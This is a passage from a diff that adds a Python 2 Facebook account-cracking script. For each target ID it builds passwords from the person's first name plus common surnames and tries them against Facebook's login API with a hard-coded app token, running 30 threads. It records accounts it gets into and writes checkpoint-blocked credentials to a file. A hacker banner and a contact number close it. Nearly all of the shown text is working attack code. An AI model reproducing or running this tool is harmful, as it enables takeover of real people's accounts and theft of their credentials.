+							print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
+
+							cek = open("out/checkpoint.txt", "a")
+
+							cek.write(user+"|"+pass2+"\n")
+
+							cek.close()
+
+							cekpoint.append(user+pass2)
+
+						else:
+
+							pass3 = a['first_name'] + 'rajpoot'
+
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+
+							q = json.load(data)
+
+							if 'access_token' in q:
+
+								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
+
+								oks.append(user+pass3)
+
+							else:
+
+								if 'www.facebook.com' in q["error_msg"]:
+
+									print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
+
+									cek = open("out/checkpoint.txt", "a")
+
+									cek.write(user+"|"+pass3+"\n")
+
+									cek.close()
+
+									cekpoint.append(user+pass3)
+
+								else:
+
+									pass4 = b['first_name'] + 'mughal'
+
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+
+									q = json.load(data)
+
+									if 'access_token' in q:
+
+										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
+
+										oks.append(user+pass4)
+
+									else:
+
+										if 'www.facebook.com' in q["error_msg"]:
+
+											print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
+
+											cek = open("out/checkpoint.txt", "a")
+
+											cek.write(user+"|"+pass4+"\n")
+
+											cek.close()
+
+											cekpoint.append(user+pass4)
+
+										else:
+
+											pass5 = b['first_name'] + 'malik'
+
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+
+											q = json.load(data)
+
+											if 'access_token' in q:
+
+												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
+
+												oks.append(user+pass5)
+
+											else:
+
+												if 'www.facebook.com' in q["error_msg"]:
+
+													print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
+
+													cek = open("out/checkpoint.txt", "a")
+
+													cek.write(user+"|"+pass5+"\n")
+
+													cek.close()
+
+													cekpoint.append(user+pass5)
+
+												else:
+
+													pass6 = b['first_name'] + 'khan'
+
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+
+													q = json.load(data)
+
+													if 'access_token' in q:
+
+														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
+
+														oks.append(user+pass6)
+
+													else:
+
+														if 'www.facebook.com' in q["error_msg"]:
+
+															print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
+
+															cek = open("out/checkpoint.txt", "a")
+
+															cek.write(user+"|"+pass6+"\n")
+
+															cek.close()
+
+															cekpoint.append(user+pass6)
+
+														else:
+
+															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+
+															b = json.loads(a.text)
+
+															pass7 = b['first_name'] + 'afridi'
+
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+
+															q = json.load(data)
+
+															if 'access_token' in q:
+
+																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
+
+																oks.append(user+pass7)
+
+															else:
+
+																if 'www.facebook.com' in q["error_msg"]:
+
+																	print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
+
+																	cek = open("out/checkpoint.txt", "a")
+
+																	cek.write(user+"|"+pass7+"\n")
+
+																	cek.close()
+
+																	cekpoint.append(user+pass7)
+
+																	
+
+															
+
+		except:
+
+			pass
+
+		
+
+	p = ThreadPool(30)
+
+	p.map(main, id)
+
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mHamiiWorld\033[1;95m♡──────────•◈•──────────♡"
+
+	print "  \033[1;93m«---•◈•---Developed By Akkuk---•◈•---»" #Dev:Akkuuk_hacker
+
+	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
+
+	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
+
+	print """
+
+             
+
+             ...........███ ]▄▄▄▄▄▃
+
+             ..▂▄▅█████▅▄▃▂
+
+             [███████████████]
+
+             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
+
+♡──────────────•◈•──────────────♡.
+
+: \033[1;96m .....Akkukhacker  zqoud........... \033[1;93m :
+
+♡──────────────•◈•──────────────♡.' 
+
+                whatsapp Num
+
+               +9190843 19506"""
+
+	
+
+	raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")
+
+	menu()
+
+if __name__ == '__main__':
+
+	login()
 
